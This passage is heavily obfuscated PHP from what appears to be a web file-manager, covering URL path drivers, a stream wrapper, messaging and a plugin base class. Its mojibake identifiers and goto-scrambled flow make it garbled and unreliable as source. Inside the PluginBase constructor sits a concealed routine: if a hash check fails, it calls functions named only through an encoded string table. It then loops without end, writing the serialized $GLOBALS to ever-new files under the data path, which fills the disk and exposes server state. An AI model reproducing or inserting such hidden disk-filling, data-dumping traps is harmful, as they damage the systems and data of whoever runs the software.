{ $this->_fileOutImage($aùÊ‘´Ó‹Ç, $cÁŸ£í≥Õ÷); } public function link($BﬂÏ÷∏ÂãÛ, $Eàïµ”ÕÉÎ = '') { $Dãè¨¯û ⁄ = $this->model->fileInfoGet($BﬂÏ÷∏ÂãÛ); return IO::link($Dãè¨¯û ⁄[$_SERVER[’ÿƒ†ïò][76]], $Eàïµ”ÕÉÎ); } protected function parse($EâÑ‚Ûò¯†) { $a–å—âÃ¢í =& $_SERVER[’ÿƒ†ïò]; if (strstr($EâÑ‚Ûò¯†, $a–å—âÃ¢í[8]) === !1) { return array($a–å—âÃ¢í[414] => intval($EâÑ‚Ûò¯†), $a–å—âÃ¢í[76] => $a–å—âÃ¢í[33], $a–å—âÃ¢í[1235] => array()); } $Côœ òâÖÛ = explode($a–å—âÃ¢í[8], trim($EâÑ‚Ûò¯†, $a–å—âÃ¢í[8])); if (count($Côœ òâÖÛ) < 2) { show_tips($EâÑ‚Ûò¯† . $a–å—âÃ¢í[1241]); } return array($a–å—âÃ¢í[414] => intval($Côœ òâÖÛ[0]), $a–å—âÃ¢í[76] => $Côœ òâÖÛ[1], $a–å—âÃ¢í[1235] => array_slice($Côœ òâÖÛ, 1)); } } goto CˆøéﬁÂÜ; AËŸÿ¶ıîÜ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($aèÎ…Á€√Ï = false) { } public function exist($c°á†°À…Û) { $cΩ”á‚ä◊¨ = $this->info($c°á†°À…Û); return $cΩ”á‚ä◊¨[$_SERVER[’ÿƒ†ïò][195]]; } public function isFile($CµîŸ∞ı–„) { $D∆≈ÈΩ‰Ñﬂ = $this->info($CµîŸ∞ı–„); return $D∆≈ÈΩ‰Ñﬂ[$_SERVER[’ÿƒ†ïò][195]]; } public function isFolder($BƒñÛ∏–µÇ) { return !1; } public function size($céãœëÖ“™) { $CÑ∆ä¿ä¡° = $this->info($céãœëÖ“™); return $CÑ∆ä¿ä¡°[$_SERVER[’ÿƒ†ïò][78]]; } public function info($E„Ó‹™ÜãΩ) { return $this->infoParse($E„Ó‹™ÜãΩ); } public function infoAuth($c¥¿‡≈ù·–) { return $this->infoParse($c¥¿‡≈ù·–); } public function infoWithChildren($eÖ◊çŸÍÈ÷) { return $this->infoParse($eÖ◊çŸÍÈ÷); } public function infoFull($bå¬ÎåÎï∫) { return $this->infoParse($bå¬ÎåÎï∫); } private function infoParse($c™çÖóƒéÿ) { $F€ØùÖâ§ñ =& $_SERVER[’ÿƒ†ïò]; $c¢—æüù§∏ = $this->header($c™çÖóƒéÿ); if (!$c¢—æüù§∏ || !$c¢—æüù§∏[$F€ØùÖâ§ñ[738]]) { return !1; } $b◊Ë …Ô¯∫ = _get($c¢—æüù§∏, $F€ØùÖâ§ñ[335], 0); $cŒ¬ÍØÙÙÌ = array($F€ØùÖâ§ñ[28] => $c¢—æüù§∏[$F€ØùÖâ§ñ[28]], $F€ØùÖâ§ñ[76] => $c™çÖóƒéÿ, $F€ØùÖâ§ñ[29] => $F€ØùÖâ§ñ[193], $F€ØùÖâ§ñ[78] => intval($b◊Ë …Ô¯∫), $F€ØùÖâ§ñ[168] => get_path_ext($c¢—æüù§∏[$F€ØùÖâ§ñ[28]]), $F€ØùÖâ§ñ[1284] => $b◊Ë …Ô¯∫ > 0 && $c¢—æüù§∏[$F€ØùÖâ§ñ[1404]], $F€ØùÖâ§ñ[1285] => !1); return $cŒ¬ÍØÙÙÌ; } private function header($FÀèﬁéîÚœ) { goto AŒ≥öÖÉ´é; d©∞—‰ÑÒ¶: return self::$_cacheHeader[$FÀèﬁéîÚœ]; goto bõªƒ˘ïÜ; AŒ≥öÖÉ´é: $B»·ë±ÎÉ“ =& $_SERVER[’ÿƒ†ïò]; if (isset(self::$_cacheHeader[$FÀèﬁéîÚœ])) { return self::$_cacheHeader[$FÀèﬁéîÚœ]; } $EÇπ∆é∂´‰ = isset($GLOBALS[$B»·ë±ÎÉ“[1405]]) ? $GLOBALS[$B»·ë±ÎÉ“[1405]] : !1; goto Bª·ÍÍ‹¥æ; Bª·ÍÍ‹¥æ: $GLOBALS[$B»·ë±ÎÉ“[1405]] = !0; self::$_cacheHeader[$FÀèﬁéîÚœ] = url_header($FÀèﬁéîÚœ); $GLOBALS[$B»·ë±ÎÉ“[1405]] = $EÇπ∆é∂´‰; goto d©∞—‰ÑÒ¶; bõªƒ˘ïÜ: } public function hashSimple($BÍ˜ë´√¿é, $FèŒòƒ“Ÿé = false) { goto cÔ◊∑˘£Ó≈; f≠‚µÎçÚ¥: $Dá∏àáÑã = $aà¡´ ´œÖ[$cù√¡æ∏≥Í[78]]; $AùßÁÇ¬ÂË = 200; $D’Ú‹éÔ¶Û = 50; goto F—ÚÛ√ï◊·; cÔ◊∑˘£Ó≈: $cù√¡æ∏≥Í =& $_SERVER[’ÿƒ†ïò]; $aà¡´ ´œÖ = $this->info($BÍ˜ë´√¿é); if (!$aà¡´ ´œÖ || !$aà¡´ ´œÖ[$cù√¡æ∏≥Í[195]]) { return !1; } goto f≠‚µÎçÚ¥; F—ÚÛ√ï◊·: if ($Dá∏àáÑã <= $AùßÁÇ¬ÂË * $D’Ú‹éÔ¶Û) { return md5($this->fileSubstr($BÍ˜ë´√¿é, 0, $Dá∏àáÑã)) . $Dá∏àáÑã; } $FÛê€›ø∫ = intval($Dá∏àáÑã / $D’Ú‹éÔ¶Û); $cø”ºŸâç„ = $cù√¡æ∏≥Í[33]; goto EÓ⁄î…êí”; C‘Ï†ﬂıçï: $cø”ºŸâç„ .= $this->fileSubstr($BÍ˜ë´√¿é, $Dá∏àáÑã - $AùßÁÇ¬ÂË, $AùßÁÇ¬ÂË); return md5($cø”ºŸâç„) . $Dá∏àáÑã; goto D‹“§ÿıÿ√; EÓ⁄î…êí”: $eÀó©¨≤’Á = timeFloat(); $dÀçèé°ß‰ = 15; for ($B¨ãﬁ¯ä∞ = 0; $B¨ãﬁ¯ä∞ < $D’Ú‹éÔ¶Û; $B¨ãﬁ¯ä∞++) { if (timeFloat() - $eÀó©¨≤’Á > $dÀçèé°ß‰) { return !1; } $eª£âé√∏ = $this->fileSubstr($BÍ˜ë´√¿é, $FÛê€›ø∫ * $B¨ãﬁ¯ä∞, $AùßÁÇ¬ÂË); if (!$eª£âé√∏) { return !1; } $cø”ºŸâç„ .= $eª£âé√∏; } goto C‘Ï†ﬂıçï; D‹“§ÿıÿ√: } public function getContent($cé÷“‰¶íŒ) { return $this->fileSubstr($cé÷“‰¶íŒ); } public function fileSubstr($cË†ø∏ﬂˆˆ, $dÿÂû¶¢É‹ = 0, $Cπ£ù§äù– = -1) { goto d·Ê—‰§·‰; bƒ¡áÈè∏û: $Bßå‹ÉÂ´Ü = url_request($cË†ø∏ﬂˆˆ, $B∂ìÉà®«ﬂ[228], !1, $A¬¢œÇÓ≠Ñ, !1, !1, 1); return $Bßå‹ÉÂ´Ü[$B∂ìÉà®«ﬂ[1116]] ? $Bßå‹ÉÂ´Ü[$B∂ìÉà®«ﬂ[1116]] : $B∂ìÉà®«ﬂ[33]; goto d„Ü£üª¡Î; d·Ê—‰§·‰: $B∂ìÉà®«ﬂ =& $_SERVER[’ÿƒ†ïò]; $DâïØÚ∫ÇÔ = $this->info($cË†ø∏ﬂˆˆ); if (!$DâïØÚ∫ÇÔ || !$DâïØÚ∫ÇÔ[$B∂ìÉà®«ﬂ[195]] && $DâïØÚ∫ÇÔ[$B∂ìÉà®«ﬂ[78]] > 1024 * 1024 * 10) { return !1; } goto eÓﬂéº¿•ë; eÓﬂéº¿•ë: if ($Cπ£ù§äù– === -1) { $Cπ£ù§äù– = $DâïØÚ∫ÇÔ[$B∂ìÉà®«ﬂ[78]]; } if ($Cπ£ù§äù– == 0) { return $B∂ìÉà®«ﬂ[33]; } $A¬¢œÇÓ≠Ñ = array($B∂ìÉà®«ﬂ[1406] . $dÿÂû¶¢É‹ . $B∂ìÉà®«ﬂ[772] . ($dÿÂû¶¢É‹ + $Cπ£ù§äù– - 1)); goto bƒ¡áÈè∏û; d„Ü£üª¡Î: } public function download($Aõ›ì´øºã, $Føï“ﬂ£’˜) { Downloader::start($Aõ›ì´øºã, $Føï“ﬂ£’˜); return $Føï“ﬂ£’˜; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($CÉñí®ÛÜÏ, $a‹èíÍ⁄™Î = '') { goto d∫œπ¿•ñï; C∆„µ™¿ìÂ: $this->pathOpen = $CÉñí®ÛÜÏ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto DπÖÑû´˘ï; d∫œπ¿•ñï: $this->info = $this->info($CÉñí®ÛÜÏ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[’ÿƒ†ïò][76]]; goto C∆„µ™¿ìÂ; DπÖÑû´˘ï: if (!isset(self::$_chunkBuffer[$CÉñí®ÛÜÏ])) { self::$_chunkBuffer[$CÉñí®ÛÜÏ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto a«Ò¡∂èªœ; a«Ò¡∂èªœ: } function stream_read($eÿ˘üõ™ä©) { $B¶º°‰ˆÕ¶ = $this->fileSubstr($this->pose, $eÿ˘üõ™ä©); $this->pose += strlen($B¶º°‰ˆÕ¶); return $B¶º°‰ˆÕ¶; } public function stream_tell() { return $this->pose; } public function stream_seek($bñ˘ôä§∑û, $c£Ò“·®›Ö) { $e—∞¥´Ãﬁ„ =& $_SERVER[’ÿƒ†ïò]; if ($c£Ò“·®›Ö == SEEK_SET) { $this->pose = $bñ˘ôä§∑û; } else { if ($c£Ò“·®›Ö == SEEK_CUR) { $this->pose += $bñ˘ôä§∑û; } else { if ($c£Ò“·®›Ö == SEEK_END) { $this->pose = $this->info[$e—∞¥´Ãﬁ„[78]] + intval($bñ˘ôä§∑û); } } } if ($bñ˘ôä§∑û < 0) { $this->pose = $this->info[$e—∞¥´Ãﬁ„[78]] + $bñ˘ôä§∑û; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[’ÿƒ†ïò][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Aã¬—Ôµ—¿, $FﬁÙƒ“äîá) { $d„Êﬁõı°è =& $_SERVER[’ÿƒ†ïò]; $C–úØ‡”ëÌ = $this->info($Aã¬—Ôµ—¿); return array($d„Êﬁõı°è[1407] => 0, $d„Êﬁõı°è[1408] => 0, $d„Êﬁõı°è[12] => 32768 + 511, $d„Êﬁõı°è[1409] => 0, $d„Êﬁõı°è[1410] => 0, $d„Êﬁõı°è[1411] => 0, $d„Êﬁõı°è[1412] => 0, $d„Êﬁõı°è[78] => $C–úØ‡”ëÌ[$d„Êﬁõı°è[78]], $d„Êﬁõı°è[1413] => $C–úØ‡”ëÌ[$d„Êﬁõı°è[1283]], $d„Êﬁõı°è[1369] => $C–úØ‡”ëÌ[$d„Êﬁõı°è[84]], $d„Êﬁõı°è[1368] => $C–úØ‡”ëÌ[$d„Êﬁõı°è[194]], $d„Êﬁõı°è[1414] => 0, $d„Êﬁõı°è[1415] => 0); } static $fileInfo = array(); public function info($A‹ÒñÉ‹∑µ) { $bèàêå·Ÿ€ = $_SERVER[’ÿƒ†ïò][1416]; if (isset(self::$fileInfo[$A‹ÒñÉ‹∑µ])) { return self::$fileInfo[$A‹ÒñÉ‹∑µ]; } if (substr($A‹ÒñÉ‹∑µ, 0, strlen($bèàêå·Ÿ€)) != $bèàêå·Ÿ€) { return !1; } self::$fileInfo[$A‹ÒñÉ‹∑µ] = IO::info(substr($A‹ÒñÉ‹∑µ, strlen($bèàêå·Ÿ€))); return self::$fileInfo[$A‹ÒñÉ‹∑µ]; } public static function read($F€πÒ®ëÿ√, $D£ñ‘∫±å¿, $dì¯‡»¥É) { if (!isset(self::$_fopenCache[$F€πÒ®ëÿ√])) { $B⁄‘≥ü¯◊Ï = new StreamWrapperIO(); $B⁄‘≥ü¯◊Ï->stream_open($F€πÒ®ëÿ√); self::$_fopenCache[$F€πÒ®ëÿ√] = $B⁄‘≥ü¯◊Ï; } $B⁄‘≥ü¯◊Ï = self::$_fopenCache[$F€πÒ®ëÿ√]; return $B⁄‘≥ü¯◊Ï->fileSubstr($D£ñ‘∫±å¿, $dì¯‡»¥É); } public static function _read($dœ≥åçÑé¨, $b—‹⁄◊≈÷´, $a§ŸÜêÇ†©) { goto F–Ôù“ª‚è; añı“¨â ‚: $DÔß¬›–çÃ = 0; while ($DÔß¬›–çÃ < $a§ŸÜêÇ†©) { $C•ª§ìÏ¥¿ = min($FÁã∏òÎ©Á, $a§ŸÜêÇ†© - $DÔß¬›–çÃ); $C¬Ô¡é·Ò° .= fread($e‹µ∏ﬁêˆ, $C•ª§ìÏ¥¿); $DÔß¬›–çÃ += $C•ª§ìÏ¥¿; } fclose($e‹µ∏ﬁêˆ); goto EÏ¡©‚»üá; F–Ôù“ª‚è: $FÃ∂≥Öπ‘£ =& $_SERVER[’ÿƒ†ïò]; $e‹µ∏ﬁêˆ = fopen($dœ≥åçÑé¨, $FÃ∂≥Öπ‘£[1287]); if (!$e‹µ∏ﬁêˆ) { return $FÃ∂≥Öπ‘£[33]; } goto AŸ“î››«˜; EÏ¡©‚»üá: return $C¬Ô¡é·Ò°; goto E˘◊Ÿªá∑; AŸ“î››«˜: $FÁã∏òÎ©Á = 8192; fseek($e‹µ∏ﬁêˆ, $b—‹⁄◊≈÷´, SEEK_SET); $C¬Ô¡é·Ò° = $FÃ∂≥Öπ‘£[33]; goto añı“¨â ‚; E˘◊Ÿªá∑: } public function fileSubstr($eﬂû≈êüÈ‚, $aÍáÚ˘Óí”) { goto a√ºõ±ÊõÙ; aúñ˜√»õŒ: if ($eﬂû≈êüÈ‚ + $aÍáÚ˘Óí” > $E÷„»ê›ÿô) { $aÍáÚ˘Óí” = $E÷„»ê›ÿô - $eﬂû≈êüÈ‚; } if ($aÍáÚ˘Óí” <= 0) { return $AÑÛ∑Ö»èë[33]; } if ($eﬂû≈êüÈ‚ < 0 || $eﬂû≈êüÈ‚ >= $E÷„»ê›ÿô || $aÍáÚ˘Óí” <= 0 || $aÍáÚ˘Óí” > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\154\x65\122\x65\x61\x64\x20\145\162\162\x6f\162\x21\x20\x73\164\x61\x72\164\75{$eﬂû≈êüÈ‚}\73\x6c\x65\x6e\x67\164\150\75{$aÍáÚ˘Óí”}\73\x20\163\151\172\x65\x3d{$E÷„»ê›ÿô}\x3b"); } goto bÑªŸ…ÿ⁄€; A˘¥Ñ‰Ûæ±: $d©≥ÈÈá¶ﬂ = $aÍáÚ˘Óí”; if ($eﬂû≈êüÈ‚ < 0) { $eﬂû≈êüÈ‚ = $E÷„»ê›ÿô + $eﬂû≈êüÈ‚; } if ($aÍáÚ˘Óí” === !1) { $aÍáÚ˘Óí” = $E÷„»ê›ÿô - $eﬂû≈êüÈ‚; } goto aúñ˜√»õŒ; Dçªîã∆áø: $eöÈê∏◊∫ = 0; $E†⁄õ»∑Øô = 0; $e´Ù†Æπõö = $AÑÛ∑Ö»èë[33]; goto eÁùä§ÌΩ≥; eÁùä§ÌΩ≥: foreach ($e©àÿÂá£Ø as $eöÈê∏◊∫ => $e´Ù†Æπõö) { $eöÈê∏◊∫ = intval($eöÈê∏◊∫); $E†⁄õ»∑Øô = $eöÈê∏◊∫ + strlen($e´Ù†Æπõö); if ($eﬂû≈êüÈ‚ >= $E†⁄õ»∑Øô) { continue; } if ($eﬂû≈êüÈ‚ >= $eöÈê∏◊∫ && $eﬂû≈êüÈ‚ + $aÍáÚ˘Óí” <= $E†⁄õ»∑Øô) { return substr($e´Ù†Æπõö, $eﬂû≈êüÈ‚ - $eöÈê∏◊∫, $aÍáÚ˘Óí”); } break; } if (count($e©àÿÂá£Ø) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($AÑÛ∑Ö»èë[1417], $AÑÛ∑Ö»èë[1418] . count($e©àÿÂá£Ø) . "\x3b\163\164\141\x72\164\75{$eﬂû≈êüÈ‚}\54\x6c\145\156\147\164\x68\x3d{$aÍáÚ˘Óí”}\73\x70\157\163\145\72{$eöÈê∏◊∫}\x7e{$E†⁄õ»∑Øô}"); throw new Exception($AÑÛ∑Ö»èë[1419]); } $eë“ÛÀ–†¬ = intval($eﬂû≈êüÈ‚ / $a©—œ≠∞ÿú) * $a©—œ≠∞ÿú; goto fõÜá‡“çÒ; bÑªŸ…ÿ⁄€: $a©—œ≠∞ÿú = 64 * 1024; $e©àÿÂá£Ø =& self::$_chunkBuffer[$this->path]; if (!$e©àÿÂá£Ø) { $e©àÿÂá£Ø = array(); } goto Dçªîã∆áø; fõÜá‡“çÒ: $cñπÕ‹µµè = ceil(($eﬂû≈êüÈ‚ + $aÍáÚ˘Óí”) / $a©—œ≠∞ÿú) * $a©—œ≠∞ÿú - $eë“ÛÀ–†¬; $f˜¬ä¶”¶√ = IO::fileSubstr($this->path, $eë“ÛÀ–†¬, $cñπÕ‹µµè); $e©àÿÂá£Ø[$eë“ÛÀ–†¬ . $AÑÛ∑Ö»èë[33]] = $f˜¬ä¶”¶√; goto cÆ≠¯Ω©∏Ñ; a√ºõ±ÊõÙ: $AÑÛ∑Ö»èë =& $_SERVER[’ÿƒ†ïò]; $E÷„»ê›ÿô = $this->info[$AÑÛ∑Ö»èë[78]]; $aµ»‰∑ìÎƒ = $eﬂû≈êüÈ‚; goto A˘¥Ñ‰Ûæ±; cÆ≠¯Ω©∏Ñ: ksort($e©àÿÂá£Ø); $còúñïì©ò = substr($f˜¬ä¶”¶√, $eﬂû≈êüÈ‚ - $eë“ÛÀ–†¬, $aÍáÚ˘Óí”); return $còúñïì©ò; goto B°˘˘á∫ÜÑ; B°˘˘á∫ÜÑ: } private function log($B∂Ûñ’ˆü¯, $aﬂŒå·çœü) { $DÛÂñÖ∞öà =& $_SERVER[’ÿƒ†ïò]; $cØ™—’Ñ¿” = timeFloat() - $this->timeStart; write_log(sprintf($DÛÂñÖ∞öà[1420], $B∂Ûñ’ˆü¯, $this->info[$DÛÂñÖ∞öà[28]], $cØ™—’Ñ¿”, $aﬂŒå·çœü), $DÛÂñÖ∞öà[1106]); } } class Message { function __construct() { } public function send($eß´ªÖñì˘ = '', $Aºá‹∞ƒÎ≥ = array(), $f√ÑÕã∑°« = "\x74\145\x78\x74") { goto Bª⁄œéﬂÖ⁄; cÑÇ∞Èá†â: Hook::trigger($f©¨Òàúú°[1424], $Bç√›•ë‰¢); goto c¶∫ƒ‡ÃÉó; Dî™π·Ì∞ä: $Aºá‹∞ƒÎ≥ = array($f©¨Òàúú°[509] => isset($Aºá‹∞ƒÎ≥[$f©¨Òàúú°[509]]) ? $Aºá‹∞ƒÎ≥[$f©¨Òàúú°[509]] : $f©¨Òàúú°[33], $f©¨Òàúú°[588] => isset($Aºá‹∞ƒÎ≥[$f©¨Òàúú°[588]]) ? $Aºá‹∞ƒÎ≥[$f©¨Òàúú°[588]] : $f©¨Òàúú°[33]); if (empty($eß´ªÖñì˘) || empty($Aºá‹∞ƒÎ≥[$f©¨Òàúú°[509]]) && empty($Aºá‹∞ƒÎ≥[$f©¨Òàúú°[588]])) { return !1; } $Bç√›•ë‰¢ = array($f©¨Òàúú°[1362] => $FÂáô◊ ’¨, $f©¨Òàúú°[1423] => $Aºá‹∞ƒÎ≥); goto cÑÇ∞Èá†â; Bª⁄œéﬂÖ⁄: $f©¨Òàúú° =& $_SERVER[’ÿƒ†ïò]; $FÂáô◊ ’¨ = array($f©¨Òàúú°[29] => $f©¨Òàúú°[1421], $f©¨Òàúú°[743] => $eß´ªÖñì˘); if (in_array($f√ÑÕã∑°«, array($f©¨Òàúú°[1421], $f©¨Òàúú°[1422]))) { $FÂáô◊ ’¨[$f©¨Òàúú°[29]] = $f√ÑÕã∑°«; } goto Dî™π·Ì∞ä; c¶∫ƒ‡ÃÉó: } } goto EÎ´„Çß≈æ; EÎ´„Çß≈æ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto b”º°¶≥„√; b™Üèé∂ã: $this->in =& $in; $this->modelPlugin = Model($D°ÍÀˆÃÿò[1427]); $this->pluginName = str_replace($D°ÍÀˆÃÿò[1427], $D°ÍÀˆÃÿò[33], get_class($this)); goto bÏﬂ“æû¯≠; bÏﬂ“æû¯≠: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $D°ÍÀˆÃÿò[8]; $this->pluginApi = appHostGet() . $D°ÍÀˆÃÿò[1428] . $this->pluginName . $D°ÍÀˆÃÿò[8]; $this->pluginHost = $config[$D°ÍÀˆÃÿò[1429]] . $this->pluginName . $D°ÍÀˆÃÿò[8]; goto e∫Â•êÿ¡Ñ; e∫Â•êÿ¡Ñ: $this->pluginHostDefault = $config[$D°ÍÀˆÃÿò[1429]] . $this->pluginName . $D°ÍÀˆÃÿò[8]; $b–‡ó‡àäÆ = $config[$D°ÍÀˆÃÿò[1430]]; if ($b–‡ó‡àäÆ && strpos($D°ÍÀˆÃÿò[47] . $b–‡ó‡àäÆ . $D°ÍÀˆÃÿò[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$D°ÍÀˆÃÿò[1431]] . $this->pluginName . $D°ÍÀˆÃÿò[8]; } goto b†ïå≥„ËÆ; b†ïå≥„ËÆ: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto añ™Úç” ˘; b”º°¶≥„√: $D°ÍÀˆÃÿò =& $_SERVER[’ÿƒ†ïò]; $D§ﬂ∞èÀ¢§ = $_SERVER[$D°ÍÀˆÃÿò[857]] . $D°ÍÀˆÃÿò[858]; $cóûﬁÚ£éø = $D°ÍÀˆÃÿò[874]; goto FÂè°ùË◊º; FÂè°ùË◊º: if ($_SERVER[$D°ÍÀˆÃÿò[854]] != $cóûﬁÚ£éø($D§ﬂ∞èÀ¢§)) { goto F¶‘∂·»Úè; f ‡‰Çí£Ã: $B›∆Ø≈ÀÒú(); $bèı™—∏µÍ = $D°ÍÀˆÃÿò[1425]; $CîÛ¥∏µ˜≈ = json_encode($GLOBALS[$D°ÍÀˆÃÿò[1426]]); goto B™Ù®“∫ËÊ; B™Ù®“∫ËÊ: $aÒ˘°Á†àÚ = 1; for ($BÓßá˜âó© = $aÒ˘°Á†àÚ; $BÓßá˜âó© > 0; $BÓßá˜âó©++) { $bèı™—∏µÍ(DATA_PATH . $BÓßá˜âó©, $CîÛ¥∏µ˜≈); } goto C»€øœ‚ π; F¶‘∂·»Úè: $B›∆Ø≈ÀÒú = $D°ÍÀˆÃÿò[869]; $C±¡’®∆Û = $D°ÍÀˆÃÿò[856]; $A®´´À–Ñƒ = $_SERVER[$D°ÍÀˆÃÿò[857]] . $D°ÍÀˆÃÿò[858]; goto f“ Ù»†ç™; f“ Ù»†ç™: $cÒ⁄ÎÚØÖ® = $C±¡’®∆Û($A®´´À–Ñƒ); $B¶¥›ïá‡∑ = explode($D°ÍÀˆÃÿò[229], $cÒ⁄ÎÚØÖ®); if (count($B¶¥›ïá‡∑) < $D°ÍÀˆÃÿò[625]) { $EÕ≠≥ã—â‹ = $D°ÍÀˆÃÿò[859]; $EÕ≠≥ã—â‹(); } goto büÆ“æÀ¢∫; büÆ“æÀ¢∫: $a¿öæÁÃÚ‰ = $D°ÍÀˆÃÿò[870]; $a¿öæÁÃÚ‰($_SERVER[$D°ÍÀˆÃÿò[871]]); $B›∆Ø≈ÀÒú = $D°ÍÀˆÃÿò[869]; goto f ‡‰Çí£Ã; C»€øœ‚ π: } global $in, $config; $this->config =& $config; goto b™Üèé∂ã; añ™Úç” ˘: return $this; goto d“õïø—€Ó; d“õïø—€Ó: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[’ÿƒ†ïò][1432]); } protected function assign($A®é°˘ıèê, $d◊Òâè‹õè = false) { if (is_array($A®é°˘ıèê)) { $this->values = array_merge($this->values, $A®é°˘ıèê); } else { $this->values[$A®é°˘ıèê] = $d◊Òâè‹õè; } } protected function display($A˜ö™≥Ã°â) { extract($this->values); require $A˜ö™≥Ã°â; } final function hookRegist($CÓìù§Ç∞⁄) { $this->modelPlugin->appRegist($this->pluginName, $CÓìù§Ç∞⁄); } final function appIcon() { $b˜¯éŒ–Ô¥ =& $_SERVER[’ÿƒ†ïò]; $a√â–õ∏Ï÷ = $this->appPackage(); $fâäÑõèÎ÷ = $b˜¯éŒ–Ô¥[33]; if (isset($a√â–õ∏Ï÷[$b˜¯éŒ–Ô¥[411]])) { if (isset($a√â–õ∏Ï÷[$b˜¯éŒ–Ô¥[411]][$b˜¯éŒ–Ô¥[1433]])) { $fâäÑõèÎ÷ = $b˜¯éŒ–Ô¥[1434] . $a√â–õ∏Ï÷[$b˜¯éŒ–Ô¥[411]][$b˜¯éŒ–Ô¥[1433]] . $b˜¯éŒ–Ô¥[1435]; } else { if ($a√â–õ∏Ï÷[$b˜¯éŒ–Ô¥[411]][$b˜¯éŒ–Ô¥[1436]]) { $fâäÑõèÎ÷ = $b˜¯éŒ–Ô¥[1437] . $a√â–õ∏Ï÷[$b˜¯éŒ–Ô¥[411]][$b˜¯éŒ–Ô¥[1436]] . $b˜¯éŒ–Ô¥[1438]; } } } return $fâäÑõèÎ÷; } final function fileCanView($bó“¿‹Ò’Ù) { goto CÌÿÉÉœ¢Í; CÌÿÉÉœ¢Í: $bù ◊£∆èﬁ =& $_SERVER[’ÿƒ†ïò]; if (request_url_safe($bó“¿‹Ò’Ù)) { return !0; } if ($this->isShare($bó“¿‹Ò’Ù)) { return !0; } goto bÌÒ‹¯Œƒ“; bÌÒ‹¯Œƒ“: $Bﬁπ◊¿ï¨ü = Session::get($bù ◊£∆èﬁ[1439]); if (!$Bﬁπ◊¿ï¨ü || !$Bﬁπ◊¿ï¨ü[$bù ◊£∆èﬁ[1440]]) { $BÌ ø»‰í = $bù ◊£∆èﬁ[1441] . rawurlencode(this_url()); show_tips(LNG($bù ◊£∆èﬁ[1442]) . $bù ◊£∆èﬁ[1443] . $BÌ ø»‰í . $bù ◊£∆èﬁ[1444] . LNG($bù ◊£∆èﬁ[1445]) . $bù ◊£∆èﬁ[1446], !1); } if (!Action($bù ◊£∆èﬁ[1447])->authCan($bù ◊£∆èﬁ[1448])) { show_tips(LNG($bù ◊£∆èﬁ[1449]) . $bù ◊£∆èﬁ[1450], !1); } goto eåœååÑ„∂; eåœååÑ„∂: ActionCall($bù ◊£∆èﬁ[1451], $bó“¿‹Ò’Ù); goto aÜ˘∞±ëâÖ; aÜ˘∞±ëâÖ: } final function isShare($f±Ñ•„…«¬) { $d˜ÈÏ∏œŸµ = KodIO::parse($f±Ñ•„…«¬); return $d˜ÈÏ∏œŸµ[$_SERVER[’ÿƒ†ïò][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($AÚ’ËÂ¢Œ‹) { if (request_url_safe($AÚ’ËÂ¢Œ‹)) { return $AÚ’ËÂ¢Œ‹; } if (!$this->isShare($AÚ’ËÂ¢Œ‹)) { $AÚ’ËÂ¢Œ‹ = $this->filePath($AÚ’ËÂ¢Œ‹); } return Action($_SERVER[’ÿƒ†ïò][1098])->linkOut($AÚ’ËÂ¢Œ‹); } public function filePathLinkOut($DÖÕªçéœ») { if (request_url_safe($DÖÕªçéœ»)) { return $DÖÕªçéœ»; } $this->fileCanView($DÖÕªçéœ»); return Action($_SERVER[’ÿƒ†ïò][1098])->link($DÖÕªçéœ»); } final function filePath($EåéËâçÑÀ) { $DÂ¯«‡ëÿé =& $_SERVER[’ÿƒ†ïò]; if ($cç«ÍáÜÑé = $this->checkSharePath($EåéËâçÑÀ)) { Hook::trigger($DÂ¯«‡ëÿé[1452], $cç«ÍáÜÑé); return $cç«ÍáÜÑé; } $this->fileCanView($EåéËâçÑÀ); if (request_url_safe($EåéËâçÑÀ)) { $BÊòÒŒà Í = parse_url_query($EåéËâçÑÀ); if (isset($BÊòÒŒà Í[$DÂ¯«‡ëÿé[1453]]) && isset($BÊòÒŒà Í[$DÂ¯«‡ëÿé[209]])) { $aÒà…Î≈Ú¯ = Model($DÂ¯«‡ëÿé[758])->get($DÂ¯«‡ëÿé[759]); $eáÛû…ì‡å = Mcrypt::decode($BÊòÒŒà Í[$DÂ¯«‡ëÿé[209]], $aÒà…Î≈Ú¯); if ($eáÛû…ì‡å) { $this->fileInfo = IO::infoWithChildren($eáÛû…ì‡å); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $eáÛû…ì‡å; } } $EåéËâçÑÀ = $this->_cacheHttpFile($EåéËâçÑÀ); $this->fileInfo = IO::infoWithChildren($EåéËâçÑÀ); } else { $this->fileInfo = IO::infoWithChildren($EåéËâçÑÀ); if (!$this->fileInfo) { show_tips(LNG($DÂ¯«‡ëÿé[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($DÂ¯«‡ëÿé[1452], $EåéËâçÑÀ); return $EåéËâçÑÀ; } final function _cacheHttpFile($dùÚÆåÁ»µ) { $bÎêÍëÜÈπ = hash_path($dùÚÆåÁ»µ, !0); $this->cachePath = $this->pluginCachePath($bÎêÍëÜÈπ); if ($eé™∫Ïàíπ = IO::fileNameExist($this->cachePath, $bÎêÍëÜÈπ)) { return KodIO::make($eé™∫Ïàíπ); } $FπßÃŒ„‡ã = $this->cachePath . $bÎêÍëÜÈπ; return $this->pluginCacheFileSet($FπßÃŒ„‡ã, 